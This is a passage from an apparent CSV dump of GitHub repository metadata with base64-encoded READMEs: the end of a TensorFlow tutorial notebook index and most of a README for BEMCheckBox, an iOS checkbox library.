cHM6Ly9naXRodWIuY29tL3NqY2hvaTg2L3RlbnNvcmZsb3ctMTAxL2Jsb2Iv
bWFzdGVyL25vdGVib29rcy9tbHBfbW5pc3Rfc2ltcGxlLmlweW5iKSAvIFtE
ZWVwZXIgTU5JU1RdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni90ZW5z
b3JmbG93LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3MvbWxwX21uaXN0X2Rl
ZXBlci5pcHluYikgLyBbWGF2aWVyIEluaXQgTU5JU1RdKGh0dHBzOi8vZ2l0
aHViLmNvbS9zamNob2k4Ni90ZW5zb3JmbG93LTEwMS9ibG9iL21hc3Rlci9u
b3RlYm9va3MvbWxwX21uaXN0X3hhdmllci5pcHluYikgLyBbQ3VzdG9tIERh
dGFzZXRdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni90ZW5zb3JmbG93
LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3MvbWxwX2N1c3RvbWRhdGFfYmFz
aWMuaXB5bmIpCjQuIENvbnZvbHV0aW9uYWwgTmV1cmFsIE5ldHdvcmsgKENO
Tik6IFtTaW1wbGUgTU5JU1RdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4
Ni90ZW5zb3JmbG93LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3MvY25uX21u
aXN0X3NpbXBsZS5pcHluYikgLyBbRGVlcGVyIE1OSVNUXShodHRwczovL2dp
dGh1Yi5jb20vc2pjaG9pODYvdGVuc29yZmxvdy0xMDEvYmxvYi9tYXN0ZXIv
bm90ZWJvb2tzL2Nubl9tbmlzdF9iYXNpYy5pcHluYikgLyBbU2ltcGxlIEN1
c3RvbSBEYXRhc2V0XShodHRwczovL2dpdGh1Yi5jb20vc2pjaG9pODYvdGVu
c29yZmxvdy0xMDEvYmxvYi9tYXN0ZXIvbm90ZWJvb2tzL2Nubl9jdXN0b21k
YXRhX3NpbXBsZS5pcHluYikgLyBbQmFzaWMgQ3VzdG9tIERhdGFzZXRdKGh0
dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni90ZW5zb3JmbG93LTEwMS9ibG9i
L21hc3Rlci9ub3RlYm9va3MvY25uX2N1c3RvbWRhdGFfYmFzaWMuaXB5bmIp
CjUuIFVzaW5nIFByZS10cmFpbmVkIE1vZGVsIChWR0cpOiBbU2ltcGxlIFVz
YWdlXShodHRwczovL2dpdGh1Yi5jb20vc2pjaG9pODYvdGVuc29yZmxvdy0x
MDEvYmxvYi9tYXN0ZXIvbm90ZWJvb2tzL3VzZV92Z2cuaXB5bmIpIC8gW0NO
TiBGaW5lLXR1bmluZyBvbiBDdXN0b20gRGF0YXNldF0oaHR0cHM6Ly9naXRo
dWIuY29tL3NqY2hvaTg2L3RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25v
dGVib29rcy9jbm5fY3VzdG9tZGF0YV92Z2dfZmluZXR1bmUuaXB5bmIpCjYu
IFJlY3VycmVudCBOZXVyYWwgTmV0d29yayAoUk5OKTogW1NpbXBsZSBNTklT
VF0oaHR0cHM6Ly9naXRodWIuY29tL3NqY2hvaTg2L3RlbnNvcmZsb3ctMTAx
L2Jsb2IvbWFzdGVyL25vdGVib29rcy9ybm5fbW5pc3Rfc2ltcGxlLmlweW5i
KSAvIFtDaGFyLVJOTiBUcmFpbl0oaHR0cHM6Ly9naXRodWIuY29tL3NqY2hv
aTg2L3RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25vdGVib29rcy9jaGFy
X3Jubl90cmFpbl90dXRvcmlhbC5pcHluYikgLyBbQ2hhci1STk4gU2FtcGxl
XShodHRwczovL2dpdGh1Yi5jb20vc2pjaG9pODYvdGVuc29yZmxvdy0xMDEv
YmxvYi9tYXN0ZXIvbm90ZWJvb2tzL2NoYXJfcm5uX3NhbXBsZV90dXRvcmlh
bC5pcHluYikgLyBbSGFuZ3VsLVJOTiBUcmFpbl0oaHR0cHM6Ly9naXRodWIu
Y29tL3NqY2hvaTg2L1RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25vdGVi
b29rcy9jaGFyX3Jubl90cmFpbl9oYW5ndWwuaXB5bmIpIC8gW0hhbmd1bC1S
Tk4gU2FtcGxlXShodHRwczovL2dpdGh1Yi5jb20vc2pjaG9pODYvVGVuc29y
Zmxvdy0xMDEvYmxvYi9tYXN0ZXIvbm90ZWJvb2tzL2NoYXJfcm5uX3NhbXBs
ZV9oYW5ndWwuaXB5bmIpCjcuIFdvcmQgRW1iZWRkaW5nIChXb3JkMlZlYyk6
IFtTaW1wbGUgVmVyc2lvbl0oaHR0cHM6Ly9naXRodWIuY29tL3NqY2hvaTg2
L3RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25vdGVib29rcy93b3JkMnZl
Y19zaW1wbGUuaXB5bmIpIC8gW0NvbXBsZXggVmVyc2lvbl0oaHR0cHM6Ly9n
aXRodWIuY29tL3NqY2hvaTg2L3RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVy
L25vdGVib29rcy93b3JkMnZlY19iYXNpYy5pcHluYikKOC4gQXV0by1FbmNv
ZGVyIE1vZGVsOiBbU2ltcGxlIEF1dG8tRW5jb2Rlcl0oaHR0cHM6Ly9naXRo
dWIuY29tL3NqY2hvaTg2L3RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25v
dGVib29rcy9kYWVfbW5pc3QuaXB5bmIpIC8gW0Rlbm9pc2luZyBBdXRvLUVu
Y29kZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni90ZW5zb3JmbG93
LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3MvZGFlX21uaXN0X2Ryb3BvdXQu
aXB5bmIpIC8gW0NvbnZvbHV0aW9uYWwgQXV0by1FbmNvZGVyIChkZWNvbnZv
bHV0aW9uKV0oaHR0cHM6Ly9naXRodWIuY29tL3NqY2hvaTg2L3RlbnNvcmZs
b3ctMTAxL2Jsb2IvbWFzdGVyL25vdGVib29rcy9jYWVfbW5pc3QuaXB5bmIp
CjkuIENsYXNzIEFjdGl2YXRpb24gTWFwIChDQU0pOiBbR2xvYmFsIEF2ZXJh
Z2UgUG9vbGluZyBvbiBNTklTVF0oaHR0cHM6Ly9naXRodWIuY29tL3NqY2hv
aTg2L3RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25vdGVib29rcy9nYXBf
bW5pc3QuaXB5bmIpCjEwLiBUZW5zb3JCb2FyZCBVc2FnZTogW0xpbmVhciBS
ZWdyZXNzaW9uXShodHRwczovL2dpdGh1Yi5jb20vc2pjaG9pODYvdGVuc29y
Zmxvdy0xMDEvYmxvYi9tYXN0ZXIvbm90ZWJvb2tzL3Zpc19saW5lYXJfcmVn
cmVzc2lvbi5pcHluYikgLyBbTUxQXShodHRwczovL2dpdGh1Yi5jb20vc2pj
aG9pODYvdGVuc29yZmxvdy0xMDEvYmxvYi9tYXN0ZXIvbm90ZWJvb2tzL3Zp
c19tbHBfbW5pc3QuaXB5bmIpIC8gW0NOTl0oaHR0cHM6Ly9naXRodWIuY29t
L3NqY2hvaTg2L3RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25vdGVib29r
cy92aXNfY25uX21uaXN0LmlweW5iKSAKMTEuIFtTZW1hbnRpYyBzZWdtZW50
YXRpb25dKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni9UZW5zb3JmbG93
LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3Mvc2Vtc2VnX2Jhc2ljLmlweW5i
KQoxMi4gW1N1cGVyIHJlc29sdXRpb24gKGluIHByb2dyZXNzKV0oaHR0cHM6
Ly9naXRodWIuY29tL3NqY2hvaTg2L1RlbnNvcmZsb3ctMTAxL2Jsb2IvbWFz
dGVyL25vdGVib29rcy9zdXBlcnJlc19jbm4uaXB5bmIpCjEzLiBbV2ViIGNy
YXdsZXJdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni9UZW5zb3JmbG93
LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3Mvd2ViY3Jhd2xpbmdfbmF2ZXJz
dG9jay5pcHluYikKMTQuIFtHYXVzc2lhbiBwcm9jZXNzIHJlZ3Jlc3Npb25d
KGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni9UZW5zb3JmbG93LTEwMS9i
bG9iL21hc3Rlci9ub3RlYm9va3MvZ3BfZGVtby5pcHluYikKMTUuIFtOZXVy
YWwgU3R5bGVdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni9UZW5zb3Jm
bG93LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3MvbmV1cmFsX3N0eWxlLmlw
eW5iKQoxNi4gW0ZhY2UgZGV0ZWN0aW9uIHdpdGggT3BlbkNWXShodHRwczov
L2dpdGh1Yi5jb20vc2pjaG9pODYvVGVuc29yZmxvdy0xMDEvYmxvYi9tYXN0
ZXIvbm90ZWJvb2tzL2Jhc2ljX29wZW5jdjIuaXB5bmIpCgojIyBSZXF1aXJl
bWVudHMKLSBUZW5zb3JGbG93Ci0gTnVtcHkKLSBTY2lQeQotIFBpbGxvdwot
IEJlYXV0aWZ1bFNvdXAKLSBbUHJldHJhaW5lZCBWR0ddKGh0dHA6Ly93d3cu
dmxmZWF0Lm9yZy9tYXRjb252bmV0L21vZGVscy9iZXRhMTYvaW1hZ2VuZXQt
dmdnLXZlcnlkZWVwLTE5Lm1hdCk6IGluc2lkZSAnZGF0YS8nIGZvbGRlcgoK
IyMgTm90ZQpNb3N0IG9mIHRoZSBjb2RlcyBhcmUgc2ltcGxlIHJlZmFjdG9y
aW5ncyBvZiBbQXltZXJpYyBEYW1pZW4ncyBUdXRvcmlhbF0oaHR0cHM6Ly9n
aXRodWIuY29tL2F5bWVyaWNkYW1pZW4vVGVuc29yRmxvdy1FeGFtcGxlcy8p
IG9yIFtOYXRoYW4gTGludHoncyBUdXRvcmlhbF0oaHR0cHM6Ly9naXRodWIu
Y29tL25saW50ei9UZW5zb3JGbG93LVR1dG9yaWFscykuIApUaGVyZSBjb3Vs
ZCBiZSBtaXNzaW5nIGNyZWRpdHMuIFBsZWFzZSBsZXQgbWUga25vdy4gCgoj
IyMjIENvbGxlY3RlZCBhbmQgTW9kaWZ5ZWQgYnkgW1N1bmdqb29uXShodHRw
Oi8vZW5naW5pdXMudGlzdG9yeS5jb20pIApbaW5mb10oaHR0cDovL2Nwc2xh
Yi5zbnUuYWMua3IvcGVvcGxlL3N1bmdqb29uLWNob2kpCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'BEMCheckBox',41844416,b'Tasteful Checkbox for iOS. (Check box)',b'Objective-C',22,2393,,2393,False,b'https://api.github.com/repos/Boris-Em/BEMCheckBox/forks',"IyBCRU1DaGVja0JveApbIVtCdWlsZCBTdGF0dXNdKGh0dHBzOi8vdHJhdmlz
LWNpLm9yZy9Cb3Jpcy1FbS9CRU1DaGVja0JveC5zdmcpXShodHRwczovL3Ry
YXZpcy1jaS5vcmcvQm9yaXMtRW0vQkVNQ2hlY2tCb3gpClshW1ZlcnNpb25d
KGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vY29jb2Fwb2RzL3YvQkVNQ2hlY2tC
b3guc3ZnP3N0eWxlPWZsYXQpXShodHRwOi8vY29jb2Fkb2NzLm9yZy9kb2Nz
ZXRzL0JFTUNoZWNrQm94KQpbIVtMaWNlbnNlXShodHRwczovL2ltZy5zaGll
bGRzLmlvL2NvY29hcG9kcy9sL0JFTUNoZWNrQm94LnN2Zz9zdHlsZT1mbGF0
KV0oaHR0cDovL2NvY29hZG9jcy5vcmcvZG9jc2V0cy9CRU1DaGVja0JveCkK
WyFbUGxhdGZvcm1dKGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vY29jb2Fwb2Rz
L3AvQkVNQ2hlY2tCb3guc3ZnP3N0eWxlPWZsYXQpXShodHRwOi8vY29jb2Fk
b2NzLm9yZy9kb2NzZXRzL0JFTUNoZWNrQm94KQpbIVtDYXJ0aGFnZSBDb21w
YXRpYmxlXShodHRwczovL2ltZy5zaGllbGRzLmlvL2JhZGdlL0NhcnRoYWdl
LWNvbXBhdGlibGUtNEJDNTFELnN2Zz9zdHlsZT1mbGF0KV0oaHR0cHM6Ly9n
aXRodWIuY29tL0NhcnRoYWdlL0NhcnRoYWdlKQoKPHAgYWxpZ249ImNlbnRl
ciI+PGltZyBzcmM9Ii4vLmFzc2V0cy9CRU1DaGVja0JveCBsb2dvLmpwZyIv
PjwvcD4JCgoqKkJFTUNoZWNrQm94KiogaXMgYW4gb3BlbiBzb3VyY2UgbGli
cmFyeSBtYWtpbmcgaXQgZWFzeSB0byBjcmVhdGUgYmVhdXRpZnVsLCBoaWdo
bHkgY3VzdG9taXphYmxlLCBhbmltYXRlZCBjaGVja2JveGVzIGZvciBpT1Mu
IAoKIyMgVGFibGUgb2YgQ29udGVudHMKCiogWyoqUHJvamVjdCBEZXRhaWxz
KipdKCNwcm9qZWN0LWRldGFpbHMpICAKICAqIFtSZXF1aXJlbWVudHNdKCNy
ZXF1aXJlbWVudHMpCiAgKiBbTGljZW5zZV0oI2xpY2Vuc2UpCiAgKiBbU3Vw
cG9ydF0oI3N1cHBvcnQpCiAgKiBbU2FtcGxlIEFwcF0oI3NhbXBsZS1hcHAp
CiAgKiBbUmVhY3QgTmF0aXZlXSgjcmVhY3QtbmF0aXZlKQogICogW05hdGl2
ZVNjcmlwdF0oI25hdGl2ZXNjcmlwdCkKICAqIFtYYW1hcmluXSgjeGFtYXJp
bikKKiBbKipHZXR0aW5nIFN0YXJ0ZWQqKl0oI2dldHRpbmctc3RhcnRlZCkK
ICAqIFtJbnN0YWxsYXRpb25dKCNpbnN0YWxsYXRpb24pCiAgKiBbU2V0dXBd
KCNzZXR1cCkKKiBbKipEb2N1bWVudGF0aW9uKipdKCNkb2N1bWVudGF0aW9u
KQogICogW0VuYWJsaW5nIC8gRGlzYWJsaW5nIHRoZSBDaGVja2JveF0oI2Vu
YWJsaW5nLS1kaXNhYmxpbmctdGhlLWNoZWNrYm94KSAKICAqIFtSZWxvYWRp
bmddKCNyZWxvYWRpbmcpCiAgKiBbR3JvdXAgLyBSYWRpbyBCdXR0b24gRnVu
Y3Rpb25hbGl0eV0oI2dyb3VwLS1yYWRpby1idXR0b24tZnVuY3Rpb25hbGl0
eSkKICAqIFtEZWxlZ2F0ZV0oI2RlbGVnYXRlKQogICogW0N1c3RvbWl6YXRp
b25dKCNjdXN0b21pemF0aW9uKQoKIyMgUHJvamVjdCBEZXRhaWxzCkxlYXJu
IG1vcmUgYWJvdXQgdGhlICoqQkVNQ2hlY2tCb3gqKiBwcm9qZWN0LCBsaWNl
bnNpbmcsIHN1cHBvcnQgZXRjLgoKPHAgYWxpZ249ImNlbnRlciI+PGltZyBz
cmM9Ii4vLmFzc2V0cy9CRU1DaGVja0JveC5naWYiLz48L3A+CQoKIyMjIFJl
cXVpcmVtZW50cwogLSBSZXF1aXJlcyBpT1MgNyBvciBsYXRlci4gVGhlIHNh
bXBsZSBwcm9qZWN0IGlzIG9wdGltaXplZCBmb3IgaU9TIDkuCiAtIFJlcXVp
cmVzIEF1dG9tYXRpYyBSZWZlcmVuY2UgQ291bnRpbmcgKEFSQykuCiAtIE9w
dGltaXplZCBmb3IgQVJNNjQgQXJjaGl0ZWN0dXJlLgoKIyMjIExpY2Vuc2UK
U2VlIHRoZSBbTGljZW5zZV0oaHR0cHM6Ly9naXRodWIuY29tL0JvcmlzLUVt
L0JFTUNoZWNrQm94L2Jsb2IvbWFzdGVyL0xJQ0VOU0UpLiBZb3UgYXJlIGZy
ZWUgdG8gbWFrZSBjaGFuZ2VzIGFuZCB1c2UgdGhpcyBpbiBlaXRoZXIgcGVy
c29uYWwgb3IgY29tbWVyY2lhbCBwcm9qZWN0cy4gQXR0cmlidXRpb24gaXMg
bm90IHJlcXVpcmVkLCBidXQgaGlnaGx5IGFwcHJlY2lhdGVkLiBBIGxpdHRs
ZSAiVGhhbmtzISIgKG9yIHNvbWV0aGluZyB0byB0aGF0IGFmZmVjdCkgaXMg
YWx3YXlzIHdlbGNvbWUuIElmIHlvdSB1c2UgKipCRU1DaGVja0JveCoqIGlu
IHlvdXIgYXBwLCBwbGVhc2UgbGV0IHVzIGtub3chCgojIyMgU3VwcG9ydApb
IVtHaXR0ZXIgY2hhdF0oaHR0cHM6Ly9iYWRnZXMuZ2l0dGVyLmltL0Jvcmlz
LUVtL0JFTUNoZWNrQm94LnBuZyldKGh0dHBzOi8vZ2l0dGVyLmltL0Jvcmlz
LUVtL0JFTUNoZWNrQm94KSAgCkpvaW4gdXMgb24gW0dpdHRlcl0oaHR0cHM6
Ly9naXR0ZXIuaW0vQm9yaXMtRW0vQkVNQ2hlY2tCb3gpIGlmIHlvdSBuZWVk
IGFueSBoZWxwIG9yIHdhbnQgdG8gdGFsayBhYm91dCB0aGUgcHJvamVjdC4K
CiMjIyBTYW1wbGUgQXBwClRoZSBpT1MgU2FtcGxlIEFwcCBpbmNsdWRlZCB3
aXRoIHRoaXMgcHJvamVjdCBkZW1vbnN0cmF0ZXMgb25lIHdheSB0byBjb3Jy
ZWN0bHkgc2V0dXAgYW5kIHVzZSAqKkJFTUNoZWNrQm94KiouIEl0IGFsc28g
b2ZmZXJzIHRoZSBwb3NzaWJpbGl0eSB0byBjdXN0b21pemUgdGhlIGNoZWNr
Ym94IHdpdGhpbiB0aGUgYXBwLgoKIyMjIFJlYWN0IE5hdGl2ZSAgCioqQkVN
Q2hlY2tCb3gqKiBjYW4gYmUgdXNlZCB3aXRoIFJlYWN0IE5hdGl2ZTogW1Jl
YWN0LU5hdGl2ZS1CRU1DaGVja0JveF0oaHR0cHM6Ly9naXRodWIuY29tL3Rv
cmlmYXQvcmVhY3QtbmF0aXZlLWJlbS1jaGVjay1ib3gpCgojIyMgTmF0aXZl
U2NyaXB0ICAKKipCRU1DaGVja0JveCoqIGNhbiBiZSB1c2VkIHdpdGggTmF0
aXZlU2NyaXB0OiBbTmF0aXZlU2NyaXB0LUJFTUNoZWNrQm94XShodHRwczov
L2dpdGh1Yi5jb20vbnN0dWRpby9uYXRpdmVzY3JpcHQtY2hlY2tib3gpCgoj
IyMgWGFtYXJpbgoqKkJFTUNoZWNrQm94KiogY2FuIGFsc28gYmUgdXNlZCB3
aXRoIFhhbWFyaW46IFtYUGx1Z2lucy5pT1MuQkVNQ2hlY2tCb3hdKGh0dHBz
Oi8vZ2l0aHViLmNvbS9zYXR1cmRheW1wL1hQbHVnaW5zLmlPUy5CRU1DaGVj
a0JveCkKCiMjIEdldHRpbmcgU3RhcnRlZApJdCBvbmx5IHRha2VzIGEgZmV3
IHNpbXBsZSBzdGVwcyB0byBpbnN0YWxsIGFuZCBzZXR1cCAqKkJFTUNoZWNr
Qm94KiogdG8geW91ciBwcm9qZWN0LgoKIyMjIEluc3RhbGxhdGlvbgoKIyMj
IyBDb2NvYVBvZHMKVGhlIGVhc2llc3Qgd2F5IHRvIGluc3RhbGwgKipCRU1D
aGVja0JveCoqIGlzIHRvIHVzZSA8YSBocmVmPSJodHRwOi8vY29jb2Fwb2Rz
Lm9yZy8iIHRhcmdldD0iX2JsYW5rIj5Db2NvYVBvZHM8L2E+LiBUbyBkbyBz
bywgc2ltcGx5IGFkZCB0aGUgZm9sbG93aW5nIGxpbmUgdG8geW91ciBgUG9k
ZmlsZWA6Cgk8cHJlPjxjb2RlPnBvZCAnQkVNQ2hlY2tCb3gnPC9jb2RlPjwv
cHJlPgoKCiMjIyMgQ2FydGhhZ2UKW0NhcnRoYWdlXShodHRwczovL2dpdGh1
Yi5jb20vQ2FydGhhZ2UvQ2FydGhhZ2UpIGlzIGEgZGVjZW50cmFsaXplZCBk
ZXBlbmRlbmN5IG1hbmFnZXIgdGhhdCBidWlsZHMgeW91ciBkZXBlbmRlbmNp
ZXMgYW5kIHByb3ZpZGVzIHlvdSB3aXRoIGJpbmFyeSBmcmFtZXdvcmtzLgoK
UnVuIGBjYXJ0aGFnZSB1cGRhdGVgIGFmdGVyIGFkZGluZyAqKkJFTUNoZWNr
Qm94KiogdG8geW91ciBDYXJ0ZmlsZSB0byBidWlsZCB0aGUgZnJhbWV3b3Jr
LiBEcmFnIHRoZSBidWlsdCBgQkVNQ2hlY2tCb3guZnJhbWV3b3JrYCBpbnRv
IHlvdXIgWGNvZGUgcHJvamVjdC4KCiMjIyMgTWFudWFsbHkJCkZpbmFsbHks
IHlvdSBjYW4gaW5zdGFsbCAqKkJFTUNoZWNrQm94KiogbWFudWFsbHkuIFNp
bXBseSBkcmFnIGFuZCBkcm9wIHRoZSAqQ2xhc3NlcyogZm9sZGVyIGludG8g
eW91ciBYY29kZSBwcm9qZWN0LiBXaGVuIHlvdSBkbyBzbywgbWFrZSBzdXJl
IHRvIGNoZWNrIHRoZSAiKkNvcHkgaXRlbXMgaW50byBkZXN0aW5hdGlvbiBn
cm91cCdzIGZvbGRlcioiIGJveC4KCiMjIyBTZXR1cApTZXR0aW5nIHVwICoq
QkVNQ2hlY2tCb3gqKiB0byB5b3VyIHByb2plY3QgY291bGRuJ3QgYmUgbW9y
ZSBzaW1wbGUuIEl0IGlzIG1vZGVsZWQgYWZ0ZXIgYFVJU3dpdGNoYC4gSW4g
ZmFjdCwgeW91IGNvdWxkIGp1c3QgcmVwbGFjZSBpbnN0YW5jZXMgb2YgYFVJ
U3dpdGNoYCBieSAqKkJFTUNoZWNrQm94KiogaW4geW91ciBwcm9qZWN0ISAg
CkhlcmUgYXJlIHRoZSBzdGVwcyB0byBmb2xsb3cgdG8gZ2V0IGV2ZXJ5dGhp
bmcgdXAgYW5kIHJ1bm5pbmc6CgogMS4gSW1wb3J0IGAiQkVNQ2hlY2tCb3gu
aCJgIHRvIHRoZSBoZWFkZXIgb2YgeW91ciB2aWV3IGNvbnRyb2xsZXI6Cgog
YGBgb2JqZWN0aXZlLWMKICNpbXBvcnQgIkJFTUNoZWNrQm94LmgiCiBgYGAK
CiAyLiAqKkJFTUNoZWNrQm94KiogY2FuIGVpdGhlciBiZSBpbml0aWFsaXpl
ZCBwcm9ncmFtYXRpY2FsbHkgKHRocm91Z2ggY29kZSkgb3Igd2l0aCBJbnRl
cmZhY2UgQnVpbGRlciAoU3Rvcnlib2FyZCBmaWxlKS4gVXNlIHRoZSBtZXRo
b2QgdGhhdCBtYWtlcyB0aGUgbW9zdCBzZW5zZSBmb3IgeW91ciBwcm9qZWN0
LgogCiAqKlByb2dyYW1tYXRpY2FsIEluaXRpYWxpemF0aW9uKiogIAogSnVz
dCBhZGQgdGhlIGZvbGxvd2luZyBjb2RlIHRvIHlvdXIgaW1wbGVtZW50YXRp
b24gKHVzdWFsbHkgaW4gdGhlIGB2aWV3RGlkTG9hZGAgbWV0aG9kIG9mIHlv
dXIgVmlldyBDb250cm9sbGVyKS4KCiBgYGBvYmplY3RpdmUtYwogQkVNQ2hl
Y2tCb3ggKm15Q2hlY2tCb3ggPSBbW0JFTUNoZWNrQm94IGFsbG9jXSBpbml0
V2l0aEZyYW1lOkNHUmVjdE1ha2UoMCwgMCwgNTAsIDUwKV07CiBbc2VsZi52
aWV3IGFkZFN1YnZpZXc6bXlDaGVja0JveF07CiBgYGAKIAogKipJbnRlcmZh
Y2UgQnVpbGRlciBJbml0aWFsaXphdGlvbioqICAKIDEgLSBEcmFnIGEgYFVJ
Vmlld2AgdG8geW91ciBgVUlWaWV3Q29udHJvbGxlcmAuICAKIDIgLSBDaGFu
Z2UgdGhlIGNsYXNzIG9mIHRoZSBuZXcgYFVJVmlld2AgdG8gYEJFTUNoZWNr
Qm94YC4gIAogMyAtIFNlbGVjdCB0aGUgYEJFTUNoZWNrQm94YCBhbmQgb3Bl
biB0aGUgQXR0cmlidXRlcyBJbnNwZWN0b3IuIE1vc3Qgb2YgdGhlIGN1c3Rv
bWl6YWJsZSBwcm9wZXJ0aWVzIGNhbiBlYXNpbHkgYmUgc2V0IGZyb20gdGhl
IEF0dHJpYnV0ZXMgSW5zcGVjdG9yLiBUaGUgU2FtcGxlIEFwcCBkZW1vbnN0
cmF0ZXMgdGhpcyBjYXBhYmlsaXR5LgoKIyMgRG9jdW1lbnRhdGlvbgpBbGwg
b2YgdGhlIG1ldGhvZHMgYW5kIHByb3BlcnRpZXMgYXZhaWxhYmxlIGZvciAq
KkJFTUNoZWNrQm94KiogYXJlIGRvY3VtZW50ZWQgYmVsb3cuCgojIyMgRW5h
YmxpbmcgLyBEaXNhYmxpbmcgdGhlIENoZWNrYm94CiMjIyMjIFRoZSBgb25g
IFByb3BlcnR5Ckp1c3QgbGlrZSBgVUlTd2l0Y2hgLCAqKkJFTUNoZWNrQm94
KiogcHJvdmlkZXMgdGhlIGJvb2xlYW4gcHJvcGVydHkgYG9uYCB0aGF0IGFs
bG93cyB5b3UgdG8gcmV0cmlldmUgYW5kIHNldCAod2l0aG91dCBhbmltYXRp
b24pIGEgdmFsdWUgZGV0ZXJtaW5pbmcgd2V0aGVyIHRoZSBCRU1DaGVja0Jv
eCBvYmplY3QgaXMgYG9uYCBvciBgb2ZmYC4gRGVmYXVsdHMgdG8gYE5PYC4g
IApFeGFtcGxlIHVzYWdlOgpgYGBvYmplY3RpdmUtYwpzZWxmLm15Q2hlY2tC
b3gub24gPSBZRVM7CmBgYAojIyMjIyBgc2V0T246YW5pbWF0ZWQ6YApKdXN0
IGxpa2UgYFVJU3dpdGNoYCwgKipCRU1DaGVja0JveCoqIHByb3ZpZGVzIGFu
IGluc3RhbmNlIG1ldGhvZCBgc2V0T246YW5pbWF0ZWQ6YCB0aGF0IHNldHMg
dGhlIHN0YXRlIG9mIHRoZSBjaGVja2JveCB0byBPbiBvciBPZmYsIG9wdGlv
bmFsbHkgYW5pbWF0aW5nIHRoZSB0cmFuc2l0aW9uLiAgCkV4YW1wbGUgdXNh
Z2U6CmBgYG9iamVjdGl2ZS1jCltzZWxmLm15Q2hlY2tCb3ggc2V0T246WUVT
IGFuaW1hdGVkOllFU107CmBgYAoKIyMjIFJlbG9hZGluZwpUaGUgaW5zdGFu
Y2UgbWV0aG9kIGByZWxvYWRgIGxldHMgeW91IHJlZHJhdyB0aGUgZW50aXJl
IGNoZWNrYm94LCBrZWVwaW5nIHRoZSBjdXJyZW50IGBvbmAgdmFsdWUuICAK
RXhhbXBsZSB1c2FnZTogIApgYGBvYmplY3RpdmUtYwpbc2VsZi5teUNoZWNr
Qm94IHJlbG9hZF0KYGBgCgojIyMgR3JvdXAgLyBSYWRpbyBCdXR0b24gRnVu
Y3Rpb25hbGl0eQoqKkJFTUNoZWNrQm94KiplcyBjYW4gZWFzaWx5IGJlIGdy
b3VwZWQgdG9nZXRoZXIgdG8gZm9ybSByYWRpbyBidXR0b24gZnVuY3Rpb25h
bGl0eS4gVGhpcyB3aWxsIGF1dG9tYXRpY2FsbHkgbWFuYWdlIHRoZSBzdGF0
ZSBvZiBlYWNoIGNoZWNrYm94IGluIHRoZSBncm91cCwgc28gdGhhdCBvbmx5
IG9uZSBpcyBzZWxlY3RlZCBhdCBhIHRpbWUsIGFuZCBjYW4gb3B0aW9uYWxs
eSByZXF1aXJlIHRoYXQgdGhlIGdyb3VwIGhhcyBhIHNlbGVjdGlvbiBhdCBh
bGwgdGltZXMuCgpgYGBvYmplY3RpdmUtYwpzZWxmLmdyb3VwID0gW0JFTUNo
ZWNrQm94R3JvdXAgZ3JvdXBXaXRoQ2hlY2tCb3hlczpAW3NlbGYuY2hlY2tC
b3gxLCBzZWxmLmNoZWNrQm94Miwgc2VsZi5jaGVja0JveDNdXTsKc2VsZi5n
cm91cC5zZWxlY3RlZENoZWNrQm94ID0gc2VsZi5jaGVja0JveDI7IC8vIE9w
dGlvbmFsbHkgc2V0IHdoaWNoIGNoZWNrYm94IGlzIHByZS1zZWxlY3RlZApz
ZWxmLmdyb3VwLm11c3RIYXZlU2VsZWN0aW9uID0gWUVTOyAvLyBEZWZpbmUg
aWYgdGhlIGdyb3VwIG11c3QgYWx3YXlzIGhhdmUgYSBzZWxlY3Rpb24KYGBg
CgpUbyBzZWUgd2hpY2ggY2hlY2tib3ggaXMgc2VsZWN0ZWQgaW4gdGhhdCBn
cm91cCwganVzdCBhc2sgZm9yIGl0OgpgYGBvYmplY3RpdmUtYwpCRU1DaGVj
a0JveCAqc2VsZWN0aW9uID0gc2VsZi5ncm91cC5zZWxlY3RlZENoZWNrQm94
OwpgYGAKClRvIG1hbnVhbGx5IHVwZGF0ZSB0aGUgc2VsZWN0aW9uIGZvciBh
IGdyb3VwLCBqdXN0IHNldCBpdDoKYGBgb2JqZWN0aXZlLWMKc2VsZi5ncm91
cC5zZWxlY3RlZENoZWNrQm94ID0gc2VsZi5jaGVja0JveDE7CmBgYAoKIyMj
IERlbGVnYXRlCioqQkVNQ2hlY2tCb3gqKiB1c2VzIGEgZGVsZWdhdGUgdG8g
cmVjZWl2ZSBjaGVjayBib3ggZXZlbnRzLiBUaGUgZGVsZWdhdGUgb2JqZWN0
IG11c3QgY29uZm9ybSB0byB0aGUgYEJFTUNoZWNrQm94RGVsZWdhdGVgIHBy
